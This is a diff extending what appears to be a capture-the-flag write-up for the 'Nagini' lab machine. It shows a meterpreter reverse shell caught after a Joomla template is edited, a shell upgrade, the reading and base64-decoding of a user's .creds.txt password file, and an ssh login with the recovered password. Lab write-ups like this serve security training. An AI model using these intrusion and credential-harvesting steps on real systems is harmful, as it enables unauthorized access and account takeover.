@@ -157,3 +157,60 @@ Now we move into the Admin console and we navigate till the Template editor.
 We are going now to paste our payload in line 9 and we save.
 
 ![Alt text](./img/editedTemplate.PNG?raw=true "Edited Template")
+
+Once saved, just go to [http://quic.nagini.hogwarts/joomla/infex.php](http://quic.nagini.hogwarts/joomla/infex.php) and **BOOOOOOOOOM**.... We got a reverse shell in our meterpreter.
+
+![Alt text](./img/reverse.PNG?raw=true "REVERSE SHELL")
+
+At this point we can open the shell and start exploring:
+
+```bash
+meterpreter > shell
+Process 3482 created.
+Channel 0 created.
+export TERM=xterm
+python3  -c "import pty;pty.spawn('/bin/bash')"
+
+```
+
+I always like to see how many users there are in the system, so I navigate in the home and noted 2 users, **snape** and **hermoine**.
+
+I went first on the snape home directory and find the .creds.txt file which contains some base64 information so i decoded it and find something I'll try next as password. Let's see the steps:
+
+```bash
+www-data@Nagini:/home/snape$ cd /home
+cd /home
+www-data@Nagini:/home$ ls
+ls
+hermoine  snape
+www-data@Nagini:/home$ cd sna
+cd snape/
+www-data@Nagini:/home/snape$ ls -l
+ls -l
+total 0
+www-data@Nagini:/home/snape$ ls -la
+ls -la
+total 32
+drwxr-xr-x 4 snape snape 4096 Apr  4 17:09 .
+drwxr-xr-x 4 root  root  4096 Apr  4 00:22 ..
+-rw-r--r-- 1 snape snape  220 Apr  3 23:57 .bash_logout
+-rw-r--r-- 1 snape snape 3526 Apr  3 23:57 .bashrc
+-rw-r--r-- 1 snape snape   17 Apr  4 10:35 .creds.txt
+drwx------ 3 snape snape 4096 Apr  4 16:38 .gnupg
+-rw-r--r-- 1 snape snape  807 Apr  3 23:57 .profile
+drwx------ 2 snape snape 4096 Apr  4 10:42 .ssh
+www-data@Nagini:/home/snape$ cat .cre
+cat .creds.txt
+TG92ZUBsaWxseQ==
+www-data@Nagini:/home/snape$ cat .creds.txt |base64 -d
+cat .creds.txt |base64 -d
+Love@lilly
+```
+
+We can now try to login as snape via ssh:
+
+```bash
+ssh snape@quic.nagini.hogwarts
+```
+
+![Alt text](./img/sanpe.PNG?raw=true "SNAPE")
